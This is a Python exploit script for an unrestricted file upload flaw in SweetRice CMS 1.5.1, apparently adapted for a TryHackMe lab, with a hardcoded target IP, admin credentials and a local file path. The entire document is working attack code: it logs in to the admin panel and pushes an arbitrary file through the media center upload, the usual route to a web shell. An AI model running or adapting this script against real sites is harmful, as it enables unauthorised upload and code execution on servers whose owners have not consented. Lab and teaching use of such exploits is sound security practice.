#/usr/bin/python
#-*- Coding: utf-8 -*-
# Exploit Title: SweetRice 1.5.1 - Unrestricted File Upload
# Exploit Author: Ashiyane Digital Security Team
# Date: 03-11-2016
# Vendor: http://www.basic-cms.org/
# Software Link: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
# Version: 1.5.1
# Platform: WebApp - PHP - Mysql

import requests
import os
from requests import session

if os.name == 'nt':
    os.system('cls')
else:
    os.system('clear')
    pass
banner = '''
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
|  _________                      __ __________.__                  |
| /   _____/_  _  __ ____   _____/  |\______   \__| ____  ____      |
| \_____  \\ \/ \/ // __ \_/ __ \   __\       _/  |/ ___\/ __ \     |
| /        \\     /\  ___/\  ___/|  | |    |   \  \  \__\  ___/     |
|/_______  / \/\_/  \___  >\___  >__| |____|_  /__|\___  >___  >    |
|        \/             \/     \/            \/        \/    \/     |                                                    
|    > SweetRice 1.5.1 Unrestricted File Upload                     |
|    > Script Cod3r : Ehsan Hosseini                                |
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
'''

print(banner)


# Get Host & User & Pass & filename
host = "10.10.4.242/content"
username = "manager"
password = "Password123"
filename = "/home/md/Desktop/TryHackMe/Lazy_Admin/aaa.txt"
file = {'upload[]': open(filename, 'rb')}

payload = {
    'user':username,
    'passwd':password,
    'rememberMe':''
}



with session() as r:
    login = r.post('http://' + host + '/as/?type=signin', data=payload)
    success = 'Login success'
    if login.status_code == 200:
        print("[+] Sending User&Pass...")
        if login.text.find(success) > 1:
            print("[+] Login Succssfully...")
        else:
            print("[-] User or Pass is incorrent...")
            print("Good Bye...")
            exit()
            pass
        pass
    uploadfile = r.post('http://' + host + '/as/?type=media_center&mode=upload', files=file)
    if uploadfile.status_code == 200:
        print("[+] File Uploaded...")
        print("[+] URL : http://" + host + "/attachment/" + filename)
        pass  
